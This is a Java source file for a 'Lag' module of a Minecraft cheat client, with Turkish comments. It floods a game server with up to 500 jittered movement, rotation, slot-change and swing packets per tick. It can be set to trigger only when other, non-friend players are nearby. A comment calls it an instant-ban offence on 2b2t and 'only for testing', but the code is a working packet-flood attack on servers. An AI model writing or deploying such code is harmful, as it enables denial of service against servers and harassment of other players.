package com.obsclient.module;

import com.obsclient.ObsClient.Module;
import com.obsclient.ObsClient.Category;
import com.obsclient.ObsClient.NumSetting;
import com.obsclient.ObsClient.BoolSetting;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.util.Hand;

import java.util.Arrays;

import static com.obsclient.ObsClient.isFriend;

/**
 * Lag - sunucuya paket yagmuru.
 * UYARI: 2b2t'de ANINDA ban sebebi. Sadece test icin.
 */
public class Lag extends Module {
    public static String status = "Off";

    final NumSetting packets  = new NumSetting("Packets/Tick", "Paket/Tick", 60, 5, 500, 5);
    final NumSetting range    = new NumSetting("TriggerRange", "Tetik Menzil", 10, 2, 40, 1);
    final BoolSetting onlyNearby = new BoolSetting("OnlyNearby", "Yakindaysa", true);
    final BoolSetting posSpam    = new BoolSetting("PositionSpam", "Pozisyon", true);
    final BoolSetting slotSpam   = new BoolSetting("SlotSpam", "Slot", true);
    final BoolSetting swingSpam  = new BoolSetting("SwingSpam", "Sallama", true);
    final BoolSetting rotSpam    = new BoolSetting("RotationSpam", "Rotasyon", true);

    public Lag() {
        super("Lag", "Lag", "Packet spam.", "Paket spam.", Category.MISC);
        settings.addAll(Arrays.asList(packets, range, onlyNearby, posSpam, slotSpam, swingSpam, rotSpam));
    }

    @Override public String status() { return enabled ? "Spamming" : "Off"; }

    @Override
    public void onDisable() {
        ClientPlayerEntity p = mc.player;
        if (p != null && mc.getNetworkHandler() != null) {
            try {
                mc.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(p.getInventory().getSelectedSlot()));
            } catch (Throwable ignored) {}
        }
    }

    @Override
    public void onTick(MinecraftClient mc) {
        ClientPlayerEntity p = mc.player;
        if (p == null || mc.world == null || mc.getNetworkHandler() == null) return;
        if (mc.currentScreen != null) return;

        // Only nearby
        if (onlyNearby.value) {
            boolean near = false;
            for (PlayerEntity o : mc.world.getPlayers()) {
                if (o == p || !o.isAlive() || o.isSpectator() || isFriend(o)) continue;
                if (p.distanceTo(o) <= range.value) { near = true; break; }
            }
            if (!near) { status = "Idle"; return; }
        }

        int n = packets.i();
        var nh = mc.getNetworkHandler();
        try {
            for (int i = 0; i < n; i++) {
                if (posSpam.value) {
                    double jx = (Math.random() - 0.5) * 0.001;
                    double jy = (Math.random() - 0.5) * 0.001;
                    double jz = (Math.random() - 0.5) * 0.001;
                    nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            p.getX() + jx, p.getY() + jy, p.getZ() + jz,
                            p.isOnGround(), p.horizontalCollision));
                }
                if (rotSpam.value) {
                    float ry = p.getYaw() + (float)((Math.random() - 0.5) * 0.5);
                    float rp = p.getPitch() + (float)((Math.random() - 0.5) * 0.5);
                    nh.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(ry, rp, p.isOnGround(), p.horizontalCollision));
                }
                if (slotSpam.value) {
                    int s = (int)(Math.random() * 9);
                    nh.sendPacket(new UpdateSelectedSlotC2SPacket(s));
                }
                if (swingSpam.value) {
                    nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
            if (slotSpam.value) {
                nh.sendPacket(new UpdateSelectedSlotC2SPacket(p.getInventory().getSelectedSlot()));
            }
            status = "Lag x" + n;
        } catch (Throwable ignored) { status = "Error"; }
    }
}